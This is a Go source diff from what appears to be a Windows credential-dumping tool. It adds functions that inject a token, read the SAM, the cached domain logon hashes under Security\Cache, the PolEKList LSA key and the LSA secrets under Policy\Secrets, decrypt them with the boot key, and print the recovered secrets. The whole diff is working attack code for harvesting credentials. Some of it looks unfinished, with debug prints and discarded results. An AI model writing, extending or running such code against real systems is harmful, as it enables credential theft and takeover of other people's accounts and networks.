@@ -7,12 +7,12 @@ import (
 	"encoding/binary"
 	"encoding/hex"
 
-	
 	"golang.org/x/sys/windows"
 
 	"strings"
 	// "log"
 	"strconv"
+
 	"golang.org/x/sys/windows/registry"
 )
 
@@ -95,6 +95,9 @@ func DumpSAM(token windows.Token) ([]*sam_account, error) {
 			acc = append(acc, &data)
 		}
 	}
+	result, err := GetCachedHash(token, bootKey)
+	fmt.Println(result)
+	getServiceUser(token)
 
 	return acc, nil
 }
@@ -119,6 +122,159 @@ func parseRIDFromKey(keyName string) (uint32, error) {
 	return uint32(ridInt), nil
 }
 
+func GetCachedHash(token windows.Token, bootkey []byte) (result []string, err error) {
+    err = InjectToken(token) // inject token
+    if err != nil {
+        return nil, fmt.Errorf("failed to inject token: %w", err)
+    }
+
+    var names []string
+    foundIterCount := false
+    
+    key, err := registry.OpenKey(registry.LOCAL_MACHINE, `Security\Cache`, registry.READ)
+    if err != nil {
+        return nil, fmt.Errorf("failed to open Security\\Cache registry key: %w", err)
+    }
+    defer key.Close()
+
+    valueNames, err := key.ReadValueNames(-1)
+    if err != nil {
+        return nil, fmt.Errorf("failed to read value names: %w", err)
+    }
+
+    for _, name := range valueNames {
+        if name == "NL$Control" {
+            continue
+        }
+        if name == "NL$IterationCount" {
+            foundIterCount = true
+            continue
+        }
+        names = append(names, name)
+    }
+
+    if foundIterCount {
+        var tmpIterCount uint32
+        // Fix: Use the correct path to open the key
+        iterKey, err := registry.OpenKey(registry.LOCAL_MACHINE, `Security\Cache\NL$IterationCount`, registry.READ)
+        if err != nil {
+            return nil, fmt.Errorf("failed to open NL$IterationCount key: %w", err)
+        }
+        defer iterKey.Close()
+
+        names, err := iterKey.ReadValueNames(-1)
+        if err != nil {
+            return nil, fmt.Errorf("failed to read iteration count value names: %w", err)
+        }
+        if len(names) == 0 {
+            return nil, fmt.Errorf("no iteration count values found")
+        }
+
+        data, _, err := iterKey.GetBinaryValue(names[0])
+        if err != nil {
+            return nil, fmt.Errorf("failed to get binary value: %w", err)
+        }
+        if len(data) < 4 {
+            return nil, fmt.Errorf("iteration count data too short")
+        }
+
+        tmpIterCount = binary.LittleEndian.Uint32(data)
+        // Store iteration count in result properties if needed
+        if tmpIterCount > 10240 {
+            // iterationCount = int(tmpIterCount & 0xfffffc00)  // Commented out since it's unused
+            fmt.Printf("Iteration count: %d\n", int(tmpIterCount & 0xfffffc00))
+        } else {
+            // iterationCount = int(tmpIterCount * 1024)  // Commented out since it's unused
+            fmt.Printf("Iteration count: %d\n", int(tmpIterCount * 1024))
+        }
+    } else {
+        fmt.Printf("Using default iteration count: %d\n", 10240)
+    }
+
+    secretKey, err := GetLSASecretkey(token, bootkey)
+	fmt.Println(secretKey)
+    if err != nil {
+        return nil, fmt.Errorf("failed to get LSA secret key: %w", err)
+    }
+
+    return names, nil // Changed to return the collected names instead of empty result
+}
+
+func GetLSASecretkey(token windows.Token, bootkey []byte) (result []byte, err error) {
+    err = InjectToken(token) // inject token
+    if err != nil {
+        return nil, fmt.Errorf("failed to inject token: %w", err)
+    }
+
+    key, err := registry.OpenKey(registry.LOCAL_MACHINE, `Security\Policy\PolEKList`, registry.READ)
+    if err != nil {
+        return nil, fmt.Errorf("failed to open PolEKList registry key: %w", err)
+    }
+    defer key.Close()
+
+    data, _, err := key.GetBinaryValue("")
+    if err != nil {
+        return nil, fmt.Errorf("failed to get binary value: %w", err)
+    }
+
+    result, err = DecryptLSAKey(bootkey, data)
+    if err != nil {
+        return nil, fmt.Errorf("failed to decrypt LSA key: %w", err)
+    }
+
+    return result, nil
+}
+func GetLSASecrets(token windows.Token, bootKey,lsaKey []byte) (secrets []string, err error) {
+	err = InjectToken(token) // inject token
+    if err != nil {
+        return nil, fmt.Errorf("failed to inject token: %w", err)
+    }
+	secrets_path := `SECURITY\Policy\Secrets`
+	reg_key, err := registry.OpenKey(registry.LOCAL_MACHINE, secrets_path, registry.READ)
+    if err != nil {
+        return nil, fmt.Errorf("failed to open PolEKList registry key: %w", err)
+    }
+	var keys []string
+    defer reg_key.Close()
+	fmt.Println(reg_key.ReadValueNames(-1))
+	keys, _ = reg_key.ReadSubKeyNames(-1)
+	for _, key := range keys {
+		
+		if key == "NL$Control" { // Skip
+			continue
+		}
+		fmt.Printf("key: %s",key)
+		valueTypeList := []string{"CurrVal"}
+		// var secret []byte
+
+		for _, valueType := range valueTypeList {
+			// var subKey []byte
+			p := fmt.Sprintf(`%s\%s\%s`, secrets_path, key, valueType)
+			k, _ := registry.OpenKey(registry.LOCAL_MACHINE, p, registry.READ)
+			value, _, _ := k.GetBinaryValue("")
+			if (len(value) !=0) && (value[0] == 0x0) {
+				record := &lsa_secret{}
+				record.unmarshal(value)
+				tmpKey := SHA256(lsaKey, record.EncryptedData[:32],0)
+				plaintext, err := DecryptAES(tmpKey, record.EncryptedData[32:], nil)
+				if err != nil {
+					fmt.Println(err)
+					continue
+				}
+				record2 := &lsa_secret_blob{}
+				record2.unmarshal(plaintext)
+				secret := record2.Secret
+				fmt.Println(secret)
+			}
+			// ps, err := parseSecret()
+			// secrets = append(secrets, *ps)
+
+		}
+	}
+	return nil, nil
+}
+
+
 
 func GetBootKey(token windows.Token) (result []byte, err error) {
 	err = InjectToken(token) // inject token
@@ -131,10 +287,12 @@ func GetBootKey(token windows.Token) (result []byte, err error) {
 	scrambled := make([]byte, 0, 16)
 	
 	// Permutation array for unscrambling
-	var p []byte = []byte{0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7}
+	var p []byte = []byte{0x8, 0x5, 0x4, 
+		0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7}
 
 	// Open the LSA key
-	key, err := registry.OpenKey(registry.LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Control\Lsa`, registry.READ|registry.QUERY_VALUE)
+	key, err := registry.OpenKey(registry.LOCAL_MACHINE, 
+		`SYSTEM\CurrentControlSet\Control\Lsa`, registry.READ|registry.QUERY_VALUE)
 	if err != nil {
 		return nil, fmt.Errorf("error opening LSA key: %v", err)
 	}
